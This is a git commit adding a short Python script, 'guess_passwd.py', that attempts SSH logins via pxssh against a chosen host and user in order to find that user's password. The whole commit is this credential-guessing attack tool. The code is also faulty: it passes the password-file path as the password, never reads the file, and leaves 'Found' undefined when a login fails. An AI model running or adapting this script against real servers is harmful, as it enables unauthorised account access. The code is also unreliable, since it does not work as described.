a70c5a9465c2244ac3034ef3b4feadaa2ced73e1
zrongh90 <397864223@qq.com>
2018-05-11 23:27:21 +0800

    guess password

---
+++ zdj/tools/guess_passwd.py
@@ -0,0 +1,33 @@
+# encoding: utf-8
+import optparse
+from pexpect import pxssh
+
+
+def connection(host, user, passwd):
+    global Found
+    global target_pwd
+    try:
+        s = pxssh.pxssh()
+        s.login(host, user, passwd)
+        Found = True
+        target_pwd = passwd
+    except Exception as e:
+        print(e)
+        print("can't not login!")
+
+
+if __name__ == "__main__":
+    parser = optparse.OptionParser("usage %prog -H <target_host> -u <target_user> -p <passwd_file>")
+    parser.add_option('-H', dest="target_host")
+    parser.add_option('-u', dest="target_user")
+    parser.add_option("-p", dest='target_pwd_file')
+    (options, args) = parser.parse_args()
+    target_host = options.target_host
+    target_user = options.target_user
+    target_pwd_file = options.target_pwd_file
+    if target_host is None or target_user is None or target_pwd_file is None:
+        print(parser.usage)
+        exit(0)
+    connection(target_host, target_user, target_pwd_file)
+    if Found:
+        print("found password:{2} for user:{0} on host:{1}".format(target_user, target_host, target_pwd))
